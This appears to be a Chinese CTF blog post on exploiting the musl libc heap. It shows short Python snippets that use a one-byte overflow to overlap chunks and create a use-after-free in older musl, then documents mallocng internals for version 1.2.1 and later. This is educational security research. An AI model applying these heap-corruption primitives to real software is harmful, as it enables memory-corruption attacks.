      <p>一般在Musl环境下的堆题，基本不存在off-by-null的情况的，因为当前chunk的csize会和下一个chunk的psize进行比对，如果不等会crash。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//__bin_chunk函数中</span></span><br><span class="line"><span class="comment">//若下一个 chunk 的 psize 不等于 self 的 csize，则 crash</span></span><br><span class="line">    <span class="comment">//相当于检测pre_size和size</span></span><br><span class="line">	<span class="keyword">if</span> (next-&gt;psize != self-&gt;csize) a_crash();</span><br></pre></td></tr></table></div></figure>

<p>而由于不重用psize字段，就算溢出一个零字节，也无法覆盖到csize字段，只能覆盖到pszie字段，所以当可以溢出一个任意字节时，我们就可以修改psize字段，向上进行堆块重叠合并。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">add_malloc(<span class="number">0x40</span>-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">1</span>,(<span class="number">0x40</span>-<span class="number">0x10</span>+<span class="number">0x1</span>),<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x10</span>)+p8(<span class="number">0x80</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br></pre></td></tr></table></div></figure>

<p>这样chunk0和chunk1就会合并到一块进入bin中，制造chunk1的堆块重叠，但是由于函数机制问题，chunk2实际上是并没有被释放到bin中的。</p>

        <h5 id="未合并前如下："   >
          <a href="#未合并前如下：" class="heading-link"><i class="fas fa-link"></i></a><a href="#未合并前如下：" class="headerlink" title="未合并前如下："></a>未合并前如下：</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181131379.png" alt="image-20220218113100251"></p>

        <h5 id="合并后如下："   >
          <a href="#合并后如下：" class="heading-link"><i class="fas fa-link"></i></a><a href="#合并后如下：" class="headerlink" title="合并后如下："></a>合并后如下：</h5>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181136514.png" alt="image-20220218113620389"></p>
<p>那么之后将chunk1释放，在将chunk0+chunk1申请回来，即可制造一个UAF了。</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">1</span>,(<span class="number">0x40</span>-<span class="number">0x10</span>+<span class="number">0x1</span>),<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x10</span>)+p8(<span class="number">0x41</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add_malloc(<span class="number">0x80</span>-<span class="number">0x10</span>)</span><br></pre></td></tr></table></div></figure>

<p>如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202181204446.png" alt="image-20220218120440262"></p>
<p>有了UAF之后就好办很多了，还是参考上述的UAF情况</p>

        <h1 id="二、1-2-1及之后版本"   >
          <a href="#二、1-2-1及之后版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#二、1-2-1及之后版本" class="headerlink" title="二、1.2.1及之后版本"></a>二、1.2.1及之后版本</h1>
      <p>这个版本下的堆管理方式有了很大的变化，可以说和原来的都不是一个东西了。</p>
<p>参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/252293" >新版musl-libc malloc源码分析与调试 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253566#h3-2" >从musl libc 1.1.24到1.2.2 学习pwn姿势 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246929" >musl-1.2.x堆部分源码分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-数据结构-1"   >
          <a href="#1-数据结构-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-数据结构-1" class="headerlink" title="1.数据结构"></a>1.数据结构</h2>
      
        <h3 id="1-chunk结构-1"   >
          <a href="#1-chunk结构-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-chunk结构-1" class="headerlink" title="(1)chunk结构"></a>(1)chunk结构</h3>
      <p>在该版本之后，并没有像之前一样将chunk结构定义在代码里，所以我们只能自己来进行猜测，大致如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint8_t</span> res;        <span class="comment">// 保留,一直为\x00</span></span><br><span class="line">    <span class="keyword">uint8_t</span> idx:<span class="number">5</span>;      </span><br><span class="line">    <span class="comment">//低5bit作为idx表示这是group中第几个chunk, 高3bit作为reserved</span></span><br><span class="line">    <span class="comment">//如果该chunk被free，则该字节被置为0xff,同时下面的offset被置为0</span></span><br><span class="line">    <span class="keyword">uint8_t</span> reserved:<span class="number">3</span>;  <span class="comment">// 不知道干啥的</span></span><br><span class="line">    <span class="keyword">uint16_t</span> offset;     <span class="comment">//与第一个chunk的偏移</span></span><br><span class="line">    					<span class="comment">//如果为4则chunk_addr-0x40=first_chunk_addr</span></span><br><span class="line">    <span class="comment">/*如果是group中的第一个chunk，那么还有如下数据</span></span><br><span class="line"><span class="comment">    struct meta* meta;//指向管理该group的meta</span></span><br><span class="line"><span class="comment">	unsigned char active_idx:5;//占据5bytes,表示该group中共有几个slot,也就是chunk</span></span><br><span class="line"><span class="comment">	char pad[UNIT - sizeof(struct meta *) - 1];</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">char</span> user_data[];    <span class="comment">// 最后一字节需要为\x00</span></span><br><span class="line">    <span class="keyword">char</span> remain_data[];  <span class="comment">// 剩余空间最后一字节需要为\x00</span></span><br><span class="line">    <span class="keyword">uint32_t</span> remain_size; <span class="comment">// chunk剩余size大小</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>如下图所示，chunk分布大概如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203181141533.png" alt="image-20220318114135427"></p>
<p>其中chunk1的idx即为该group中的第1个Chunk，为0x1</p>
<p>而这整片开辟的空间，包括未被分配的chunk，如下面的马赛克部分且一直向下延申到一定位置，连在一起叫做<code>group</code></p>

        <h3 id="2-group"   >
          <a href="#2-group" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-group" class="headerlink" title="(2)group"></a>(2)group</h3>
      <p>也就是通过mmap开辟出来用来存放chunk的一片空间，定义如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">//即上图头部chunk0中的第一个指针地址</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> active_idx:<span class="number">5</span>;<span class="comment">//占据5bytes</span></span><br><span class="line">	<span class="keyword">char</span> pad[UNIT - <span class="keyword">sizeof</span>(struct meta *) - <span class="number">1</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> storage[];</span><br><span class="line">    <span class="comment">//即从头部chunk0从0x41开始一直往下的部分，包括chunk1,chunk2..以及未被分配出去的Chunk</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>且group中存放的Chunk的size是在一个范围内，通过如下定义以及计算</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IB 4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">    <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">    <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">    <span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">    <span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">    <span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">    <span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">    <span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">    <span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">    <span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">    <span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">    <span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">a_ctz_32</span><span class="params">(<span class="keyword">uint32_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> a_clz_32</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">31</span>-a_clz_32(x&amp;-x);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> debruijn32[<span class="number">32</span>] = &#123;</span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="number">23</span>, <span class="number">2</span>, <span class="number">29</span>, <span class="number">24</span>, <span class="number">19</span>, <span class="number">3</span>, <span class="number">30</span>, <span class="number">27</span>, <span class="number">25</span>, <span class="number">11</span>, <span class="number">20</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="number">31</span>, <span class="number">22</span>, <span class="number">28</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">21</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">16</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">14</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> debruijn32[(x&amp;-x)*<span class="number">0x076be629</span> &gt;&gt; <span class="number">27</span>];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">a_clz_32</span><span class="params">(<span class="keyword">uint32_t</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    x &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">4</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    x |= x &gt;&gt; <span class="number">16</span>;</span><br><span class="line">    x++;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">31</span>-a_ctz_32(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">size_to_class</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    n = (n+IB<span class="number">-1</span>)&gt;&gt;<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> (n&lt;<span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">    n++;</span><br><span class="line">    <span class="keyword">int</span> i = (<span class="number">28</span>-a_clz_32(n))*<span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;size_classes[i+<span class="number">1</span>]) i+=<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (n&gt;size_classes[i]) i++;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>相关汇总计算如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0x0     ~ 0xc -&gt;0</span><br><span class="line">0xd     ~ 0x1c -&gt;1</span><br><span class="line">0x1d    ~ 0x2c -&gt;2</span><br><span class="line">0x2d    ~ 0x3c -&gt;3</span><br><span class="line">0x3d    ~ 0x4c -&gt;4</span><br><span class="line">0x4d    ~ 0x5c -&gt;5</span><br><span class="line">0x5d    ~ 0x6c -&gt;6</span><br><span class="line">0x6d    ~ 0x7c -&gt;7</span><br><span class="line">0x7d    ~ 0x8c -&gt;8</span><br><span class="line">0x8d    ~ 0x9c -&gt;9</span><br><span class="line">0x9d    ~ 0xbc -&gt;10</span><br><span class="line">0xbd    ~ 0xec -&gt;11</span><br><span class="line">0xed    ~ 0x11c -&gt;12</span><br><span class="line">0x11d   ~ 0x13c -&gt;13</span><br><span class="line">0x13d   ~ 0x18c -&gt;14</span><br><span class="line">0x18d   ~ 0x1ec -&gt;15</span><br><span class="line">0x1ed   ~ 0x23c -&gt;16</span><br><span class="line">0x23d   ~ 0x29c -&gt;17</span><br><span class="line">0x29d   ~ 0x31c -&gt;18</span><br><span class="line">0x31d   ~ 0x3ec -&gt;19</span><br><span class="line">0x3ed   ~ 0x47c -&gt;20</span><br><span class="line">0x47d   ~ 0x53c -&gt;21</span><br><span class="line">0x53d   ~ 0x65c -&gt;22</span><br><span class="line">0x65d   ~ 0x7ec -&gt;23</span><br><span class="line">0x7ed   ~ 0x91c -&gt;24</span><br><span class="line">0x91d   ~ 0xa9c -&gt;25</span><br><span class="line">0xa9d   ~ 0xcbc -&gt;26</span><br><span class="line">0xcbd   ~ 0xfec -&gt;27</span><br><span class="line">0xfed   ~ 0x123c -&gt;28</span><br><span class="line">0x123d  ~ 0x153c -&gt;29</span><br><span class="line">0x153d  ~ 0x198c -&gt;30</span><br><span class="line">0x198d  ~ 0x1fec -&gt;31</span><br><span class="line">0x1fed  ~ 0x247c -&gt;32</span><br><span class="line">0x247d  ~ 0x2a9c -&gt;33</span><br><span class="line">0x2a9d  ~ 0x331c -&gt;34</span><br><span class="line">0x331d  ~ 0x3fec -&gt;35</span><br><span class="line">0x3fed  ~ 0x490c -&gt;36</span><br><span class="line">0x490d  ~ 0x553c -&gt;37</span><br><span class="line">0x553d  ~ 0x664c -&gt;38</span><br><span class="line">0x664d  ~ 0x7fec -&gt;39</span><br><span class="line">0x7fed  ~ 0x923c -&gt;40</span><br><span class="line">0x923d  ~ 0xaa9c -&gt;41</span><br><span class="line">0xaa9d  ~ 0xccbc -&gt;42</span><br><span class="line">0xccbd  ~ 0xffec -&gt;43</span><br><span class="line">0xffed  ~ 0x1247c -&gt;44</span><br><span class="line">0x1247d ~ 0x1553c -&gt;45</span><br><span class="line">0x1553d ~ 0x1997c -&gt;46</span><br></pre></td></tr></table></div></figure>

<p>也就是说一个group中的chunk大小范围要么是<code>0x0 ~ 0xc </code>，要么是<code>0xd~ 0x1c</code>，依次类推。且依据上述转换表，一个范围对应一个索引，该索引即用来寻找meta的索引。</p>

        <h3 id="3-meta"   >
          <a href="#3-meta" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-meta" class="headerlink" title="(3)meta"></a>(3)meta</h3>
      <p>而用来管理group的结构称为meta，一个meta对应一个group，而上面结构定义中的group中的meta指针即指向管理本group的meta，其定义如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="comment">//存在多个meta，通过循环双向链表串联起来</span></span><br><span class="line">    <span class="comment">//释放之后有用,没有释放的则指向本身</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">//指向本meta管理的group</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//freed_mask是当前meta的group中被free的chunk的bitmap, 4bytes</span></span><br><span class="line">    <span class="comment">//avail_mask是当前meta的group中目前可用chunk的bitmap, 4bytes</span></span><br><span class="line">   	<span class="comment">//由于是4bytes，总共32bit，那么最多可有32个chunk</span></span><br><span class="line">    <span class="comment">//这里很奇怪啊，直接0/1表示可用不可用呗，那要是某个chunk在这两个free和avail的bitmap</span></span><br><span class="line">    <span class="comment">//中对应的bit都为1或都为0又怎么算呢</span></span><br><span class="line">    <span class="comment">//这里好像被free的chunk其freed_mask对应的bit会马上被置为1</span></span><br><span class="line">    <span class="comment">//但是avail_mask对应的bit却不会马上置1，暂时标记不可用状态</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">	<span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>;<span class="comment">//group中最后一个chunk的idx索引 (5bit)</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;<span class="comment">//表示当前meta是否可以被free(1:可以，0:不可以)(1bit)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//由于一个Group中的chunk的size在一个范围内，所以需要通过sizeclass来追踪计算size</span></span><br><span class="line">	<span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">//(6bit)</span></span><br><span class="line">    </span><br><span class="line">	<span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>


        <h3 id="4-meta-area"   >
          <a href="#4-meta-area" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-meta-area" class="headerlink" title="(4)meta_area"></a>(4)meta_area</h3>
      <p>顾名思义，这个结构就是用来管理meta的，相关定义如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> chevck;   		<span class="comment">//校验值</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span> <span class="comment">//下一个分配区，即下一页(0x1000为一页)</span></span><br><span class="line">    <span class="keyword">int</span> nslots;    			<span class="comment">//总共多少个slots</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span> 	<span class="comment">//从其中索引其下面的meta</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>分配meta时, 总是先分配一页的内存, 然后划分为多个等待分配的meta区域，meta_arena描述的就是一页内存的最开始部分。</p>

        <h3 id="5-malloc-context"   >
          <a href="#5-malloc-context" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-malloc-context" class="headerlink" title="(5)malloc_context"></a>(5)malloc_context</h3>
      <p>这个就相当于整个分配内存机制总管理的一个结构，类似于glibc中的<code>main_arena</code>相关定义如下</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.2.1-src/malloc/mallocng/meta.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> secret;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="keyword">size_t</span> pagesize;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> init_done;     <span class="comment">//有无完成初始化</span></span><br><span class="line">    <span class="keyword">unsigned</span> mmap_counter;   <span class="comment">//mmap内存总数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span> <span class="comment">//释放的meta组成的队列</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span>  <span class="comment">//指向可用meta对象</span></span><br><span class="line">    <span class="comment">//可用meta计数、可用meta_area计数、不知道</span></span><br><span class="line">    <span class="keyword">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span> <span class="comment">//分配区头尾指针</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span>   <span class="comment">//活动的meta</span></span><br><span class="line">    <span class="keyword">size_t</span> usage_by_class[<span class="number">48</span>]; <span class="comment">//这个大小级别使用了多少内存</span></span><br><span class="line">    <span class="keyword">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> seq;</span><br><span class="line">    <span class="keyword">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> <span class="title">ctx</span>;</span></span><br></pre></td></tr></table></div></figure>

<p>总的来说，数据结构大致如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203172053962.png" alt="img"></p>

        <h2 id="2-维护方式-1"   >
          <a href="#2-维护方式-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-维护方式-1" class="headerlink" title="2.维护方式"></a>2.维护方式</h2>
      <p>使用<code>freed_mask</code>和<code>avail_mask</code>来确定，如下图所示，在<code>active[2]</code>(即size在0x1d~0x2c的chunk)中现在有</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171413463.png" alt="image-20220317141333259"></p>
<p>我们将active[2]中<code>avail_mask</code>置1的chunk都申请出来之后，即代表这个group无法接着为我们的申请提供chunk的话，比如这里就是需要申请出chunk0~chunk9，然后再申请的话就会进行判断</p>
<ul>
<li>如果该group中存在被free的chunk，即<code>freed_mask</code>中置1的chunk，那么就返回该chunk，这里也存在一个顺序问题，不会管是先释放还是后释放的，只会从上到下进行分配，如下代码</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i,<span class="number">0x10</span>,p8(i)*<span class="number">0x10</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">	free(i)</span><br><span class="line"></span><br><span class="line">dbg()    </span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">pause()</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">0x10</span>,p8(<span class="number">0x11</span>)*<span class="number">0x10</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></div></figure>

<p>第一次<code>dbg()</code>断点的地方先申请8个chunk，那么现在在该group的<code>avail_mask</code>中应该为<code>1100000000</code> 而<code>freed_mask</code>应该为<code>1111111</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171434757.png" alt="image-20220317143430652"></p>
